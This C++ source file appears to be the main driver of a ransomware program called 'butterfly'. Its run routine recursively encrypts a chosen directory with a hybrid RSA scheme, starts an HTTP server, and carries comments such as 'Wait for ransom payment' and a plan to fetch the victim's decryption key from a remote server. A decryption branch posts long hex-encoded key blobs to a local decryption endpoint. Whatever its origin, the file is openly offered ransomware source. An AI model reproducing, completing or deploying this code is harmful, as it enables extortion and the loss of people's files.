
#include "butterfly.h"
#include "httpClient.h"

namespace butterfly
{

Butterfly::Butterfly(int argc, char *argv[]) : _argparse(new butterfly::ArgumentParser(argc, argv))
{

    // parse args with the argument parser
    _args = _argparse->parseArgs();

    // init logging
    initLoggingFramework();

}

void Butterfly::initLoggingFramework()
{
    // Logger is disabled as default setting
    #ifdef LOGGING
    Logger::disable();
    #endif

    if ( !_args.config.empty() )
    {
        // init logger instance
        #ifdef LOGGING
        Logger::initFromConfig(_args.config);
        #endif
    }
    
    #ifdef LOGGING
    if( Logger::isConfigFileAvailable() )
    {
        LOG_INFO("Running " << PROJECT_NAME << " version " << _args.version);
    } else
    {
        std::cout << "Running " << PROJECT_NAME << " version " << _args.version << std::endl;
    }
    #else
    std::cout << "Running " << PROJECT_NAME << " version " << _args.version << std::endl;
    #endif
}

void Butterfly::run()
{

    // Start Hybrid Encryption Mechanism (Encryption + Remote Server Request + Decryption)
    if ( !_args.dir.empty() )
    {
        // Start encryption
        std::unique_ptr<butterfly::hybrid::Encryptor> encryptor(new butterfly::hybrid::Encryptor(2048));
        std::cout << "Start Encryption+Decryption from directory " << _args.dir << std::endl;
        encryptor->invokeDir(_args.dir, _args.protection);

        // After encryption start http server, gui or wallpaper
        std::shared_ptr<butterfly::HTTPServer> server = std::make_shared<butterfly::HTTPServer>(8081);
        //server->registerMasterPKeyCB(std::bind(&hybrid::Decryptor::invokeDir, decryptor, std::placeholders::_1));
        server->run();

        // Wait for ransom payment

        // Create HTTP Get Request to bflyServerApp to get the decrypted CPrivateRSA.pem string

        // Start decryption
        std::shared_ptr<butterfly::hybrid::Decryptor> decryptor = std::make_shared<butterfly::hybrid::Decryptor>();
        decryptor->setDirPath(_args.dir);
        //decryptor->invokeDir("/home/christian/projects/butterfly/masterkeys/SPrivateRSA.pem");
    }
    // Start only Encryption
    else if ( !_args.encrypt.empty() )
    {

        std::unique_ptr<butterfly::hybrid::Encryptor> encryptor(new butterfly::hybrid::Encryptor(2048));
        std::cout << "Start Encryption from directory " << _args.encrypt << std::endl;
        encryptor->invokeDir(_args.encrypt, _args.protection);

    }
    // Start only Decryption
    else if ( !_args.decrypt.empty() && _args.serverpKey.empty())
    {
        std::unique_ptr<butterfly::hybrid::Decryptor> decryptor(new butterfly::hybrid::Decryptor());
        std::cout << "Start Decryption from directory " << _args.decrypt << std::endl;
        decryptor->setDirPath(_args.decrypt);
        //TODO create server request to get the decrypted CPrivateRSA.pem string
        //decryptor->invokeDir(_args.serverpKey);
        std::unique_ptr<butterfly::HTTPClient> httpClient(new butterfly::HTTPClient(5000));
        httpClient->setFormParam("CPrivateRSA.bin", "4bb45ce5e570d897780d1215b09ea572f56a2dd0c1f4b4eb3f9f9120d6f57eb0dbc798f5af143150d6af9789d6e43bec83f40b98cc033eedeebb89dc487939399d95d993d28f476e7defafe31bfc3706a692cb8b1e43e14a8caa2b5b8306defa493cd957e01c285cc6c30f81f955c4cf6bea367f1198d96b836200b63c330dd37100546246a583d6a3a15a5fd70492eaf5f8b56c9e5b38fda09b5da0d3c6dd76a55905148ff0e542de0645ae2d6859abf0de409c245765ebeb7d67e540848a5064e4f0c82dbf91939b0492e4b15e3d93d7b7a38886cf88905e3073234d7dd4f3a9e60cf7f08bb633adeba4b2cef741a45d7ef1426b950a3181076836110902c0920e58c0d81da5c8db853978bc90fb823a6457988b2b4742ac5930b4dc7907666d3f30ed90ed5cde504dbefd6dc65730e49bf90231158b0cb2e82d545dbaaa183e03ef70a9ded8d5b55469e20dc1ebbce9b7e824ed86a4919a021c737969161f779661688677ada9efb2a4e13e6f7d6294f2d76873c9b7b8ef9eec29efc5b616a8dd7c2fa1d7ce9427cec5c7de6f3275ae385208c65af7b7418c9b6e7dbcfbfd36d8680156248f15441ee29a21d685a63550b7007c8ef9c1fec10a84577df9d28ccf73a981ccc7cdb1e178a51007289e88fa92f3ed67a8d986871f5190e239b5eaee1ad7ec705786dffbff9f20f44181673db3acf8c5a91294744546a48a442a89773e38cee3b191cc9718a8033882d5a02fd8a82d0bb26e871a8af32f4bb7f7cfa995bf3fd8dd90bc4acaa1b65d146bf116d323ac19538570f51996e1b7d208c4c2f31b109fdede8dc1b87dd72b2bc0cb161a397eccdab3189f0d17dd00c0130b88ef151365cc716132e3d8a2f5df1fbf91cc41f3529f1265dbbc2cc352c9a4f7a2c47e75ef707811a838ff289737722621988f04626d90ea6c7a7fe3a8e919cdc851b6770e91096aad49ce767dfa3d357936f87de29e4302faf092a36deb316c8a9b550044bf03b7827f0f3914e0292c3a5758cf39a2c05d76d86cbb3a4d21fb5e607a08e7cb38fc549595635767a32c3f215397c0cdce831bc18f5ac33710d88e01b5594e0bd3767006c655c2c5a4f0f8a11377820372ab8ab242451e443a5ac683b23c420dc234f0963340b0924b8fc6b8a6fc1962412153e2477a762e07f70ca268f5de35430c971130a49bbe2921fa4eba8de650adbb8a82bd3757b07a579b319e8041ffc8f0fab2b5ef164f6b6bb48ec33dd86d0769c4b0c277b45e4b15790846e929d7def4112b681bfa9edb69846f3f3c1ffa194e0d19fbd2441ffeb5db63109d31bc7c105b7950408cd5cf4008426d10f95e9af1387167ff7f731e5502fe541020dd7f076db25c432b7dc36aaa355da47d64a5b5db34c6a020e3b247cae79ab5aec2662533d2fdf3c71f681222a503d26006c58b39e0ba341c33c5aef5653ee06036c7641e5fca05bcff6dd53068886ff9ce3505e919944db60055977575a54aceb1f6ac80e54fddd851579623918dc7cd6de866d8c48e4795e9be8a80b382a69c3f4a919e8b9e8313b817ba15cec0bc25658ad8636b8c2eb6bde08e9c5fab94344796ced9be514310c76326a908802ac465a68ede3e7199ab847b64fea9e6ebe0fee4d8aa10b879a1046c97cc8eae79ef362f60a164847ee4aa80db356aa09c49c669be8ce151793b2d6207206d5e2716fcb642981268d13518538766ad2027423aa8fe1a4b2bd5bf781fb38e0ec57fa0ea3b1f5b8d7966e801056587cab633b5f3927e9f021ee9d7f9fff61cbcc9db3de7cb1ed30761f5589c533e5c4724c7c99f32f969dde053621e50cecca9afb3ba9a40ec77ebe955682cdb73b11be28ba0b7754be8fdc490a59f875a6c8f9a1d3b42bc5589a15fb0d266b2f65713e055c7cfc9951fbe4bf4d79d9faf703db572b2da6154757ecd9b84e07c0881242229cc0dfbc1a3c486217dd16783b3536d5b3f06cc65f61f28c1b661c5540dac9a8b7d89854e449f07d118393ec3837932ef6a9794b830823d3619e421cd637f03f379792d122cd5ff61bfb5f3ac023e27b7680f8258d0bc32c76b3a2ccc83e7dbff58c08bbf7833245d91cf313878f7d20309a7ee51857f38cffa923c15145feee9c880ca0baa748ae92c6a3eb27c3c9e09a5e53931e84682d4812fa9ced199debebd380bb4f19d0c422803a120a0ce89abbacbfa5e0a6cd755385a7f126f09b02f43fae800fffb6aefb8856c8866607fe6e259712f80241cb109aba1648e6eef4cbc0d018d1b32cff5367b921885d6be15724ef385ba31ccc08e24b3f8bd6bf7a4bc6194750ff6c5ab55f3142b80bf05346a92dc018f976d6d7e211d9ef953e1bcdba5c368821c5e59355f4e");
        httpClient->setFormParam("RSA.bin", "32a706d741bbf3b08f3d4ee68b80088718539675ba60de9f4492db5407bd989dabcd19c9395c171b93153e650900e382311b7ae8aa7613230ccd05ad25947cc48a63ebeb83afdef8e16272c7b60cd34cb725d6e5e87051817ddf356c1e004ca6625ddc544c6f0ace8cb475a17f021a98433ad500697b1bde041092b019293d2830663c407a60047c7eae7396e4aa3e10f99b2df1057af3d013c2f6f3d16bde9b54b39d923bc15afc7e2d54d15c56d7a62777cb2febbd99a4c08f755ea6078b59396d443aa12beff5e4a9d81dcfcfc50bb600edc06e189c3f7fe43849ab382a66e66abb744af73b2d628c68b70413a180ace0c9fe1865a975446ac2385a9f4ae8a6650b884b4713816605d6351f34813f51bad4ab25d6cebef610ba0c02b9f95c81243a535dfea3991bbd8490734ae074debb76d71e082caa6a2235b2e7c8ecbced03271533f4a3d2caad003a9a7bebf942def668e0b2dbda5136fc310e8d1f3d562433e225520ec862b89515b355d055b02918c4f25da854d4ea48653d03273abb196286f3303959ec7f0072b01d4b2833a6181fcbb718228bc1e7be1c9681b70092187b87908d0bee878d8d2ff5413e20c1e27c1b1ab72bfff6e8fb7751a93002335456ada300325cbd8eab34c2c4a6c6dde7012e6e9cec20b5ff105b031608cf7d1e2ff9ab5f01d38d7f5d2833a92dae80e037e2c06a124ceb66021cc77a4c01d0b6d8dc0c4e4865d6a258cb9ec17fc1f50c75cb8abe33c53f53a7d76e2516b12d505620f2c4eaa5840a3ec81fbe2ca5e23a611d6fd46a130d969a2d6e22506f0ac976caceacfd3655e4e85ace486de4c830e38ebdf0d5872154dc5ae5163fa744e9b95efaf60350f96956da0591ae92b6db2427e5637d5e4497c975df8d512cd0a5688896b373cff5ebbd508bc368f5c495dd07f01317c87bf57073f8e01f1686424d0fe57b21600e97202e895f6648c039a1d5185cae059085603ba546669947b038fa1a3df14b63c79455fde75971a97297d0d6240bdcb519c654807f1a63a39903590ccfc26fd6207234613dbd7592333d222475bb5e71cece2154a8d3fdcdfe6c9ecb14ab10fc6c69d3c547a54de7bb8aa81c7c2d9f1da2f5f4aff35821dc4fa0f12a4d9a0b1f09dae45b57f76da67a276677817e18afbb669bece62f51eca693c4e1fc23a3c05a52b6ca27b77358e1ad4d724bd75cb7a1ac93101d8e43b08b0ced5db7aa36316f497a328bc299dcf5cd1aa5e2277195cd399892a9b0ddc50897d97f3b55a4921107fbf97c355aa4ac640f2e1447ffd2077046ee46c52c0420bb9f4983b00657de05cd12bcb796d0cc0a2a9796fda2f8989a721370147b63f77d815dee024107f6e1601e102da9041f747c12131e2d388d882147b3b6df205f218cfaf857352fc09bd0a2e0407f6de87f5859420ac47659d926ba6fd740bba1628fa43c6e6f175979bf2b06309089c2186bdfa7c026fbd01dc221884d7de8390012802a26b41a2a1c1559c1a726f0d89fcc7032adab11dc7eb42df60b6b5896c37d40e0a80486110fc33c5bacd6881cd00497fa0b7bf149153791074106d038889a3e05da80055fdb6eb63146476cb14a63b8fcac5126463494b17b3c6fe771b867ed475944a56131168e28853596b44ef6aef74a10ec9ca4a9a33e6d6a54b8ba53f084bc67f234269ee6b2740475fb3d7818e6298ee2ed3eade3ea0e2651549c16b38d85be61d11782f021e6156b8985579cff217e4906d30774d8265b59eabde54356f3a5de09986a4164e9bd4bc8972e4e7976ceb5120e376d359eff7efeb1b77a1927a9c113bee9cd2f848bc65ee3b5757a54b5d72783366ac50466369ac84d2c8bbc0c438c93a7bb7c815a260c49b42aa29de3972ac55330532dabbb1ab16a4b2432d1f1aecbb193b0a0e90d4b07da700f6060c598d5a84caac398cda11d1a5c2b918dd6fdbbdd333413feac9981fd4b649f73e1130506c4923cccc5a82b3e135a20c235b87b0e14398d56f3b3f8f16000f97ec24eb08932ad5003a7b3bfa4ecb413afa94e490d85c838a71e7df3e8fb9214869c0b04011fbe26453c142dd5b116519d7a204bee00be382b4068bbeefad232084a3389c2fc7ff5d1e8daca70cb4ccee313034178949d7e8e6e4720eb4e9c70c87c746db355acf5bf213052349664ba55908050b1e35b2d90bd76580d8227247abcff474782a3bdb03659238fa55f44ab57b5d0319cf249b257570bbc504fef0d6ebc973ad1af58130bf9ec91bda9e00c20b472c93e9e4ba563959c3512d2abeb24d6c419fc8a60ee1285e43842ad6370491677247eb51c5fc9c1593db022a94ce5901e56d076ed1aece897e36198352ae4e80e973edda8e98f9c278a1776c5ae73a05c14dc986abdeacaf30b4dcd791151d11f29921172cc5e97e2b05a3b47a47f336439f2f0625a922fa3a86d742cd89abf648e8338579dd5286eea24706672166698b6d08749ff3bd7fb4f36ffde996b82de905b2b481ffce23e6ac1aefdbf4f2cbdb514eab431940b3d0a3546787777b07d18532f581c2b9325bbe619f1d980be8335b9df23fb7d7ce2367730e3e3a7d03e6004b8084eb23f0904a26dae5a360aa54180ab74e490c88eac259c271a487ba121ecbd32788605ac2c5a984c2b1d5367fb59c1f6a24977bea9c244c8693e07b1dc268aef0d4f379849511bdc0b953a7a250ae76496a4951780e20219dfebbf6e3d2890edc4f83724ec658ac138ea972c6aeeaef470e6b18168bc660ea6ad59434b189dbe34cc297dc64be98016ea6f0232b1570e8a3afb935fb718e580a4dbacfce1c87e5a7a8249a42e07eeab");
        httpClient->post("http://localhost:5000/decryption/");
    }
    // Start Decryption with provided key
    else if ( !_args.decrypt.empty() && !_args.serverpKey.empty())
    {
        std::unique_ptr<butterfly::hybrid::Decryptor> decryptor(new butterfly::hybrid::Decryptor());
        std::cout << "Start Decryption with provided key " << _args.serverpKey << " from directory " << _args.decrypt << std::endl;
        decryptor->setDirPath(_args.decrypt);
        decryptor->invokeDir(_args.serverpKey);
    }
    else
    {
        throw ButterflyException("Invalid usage of the command line arguments!");
    }

}

} // namespace butterfly
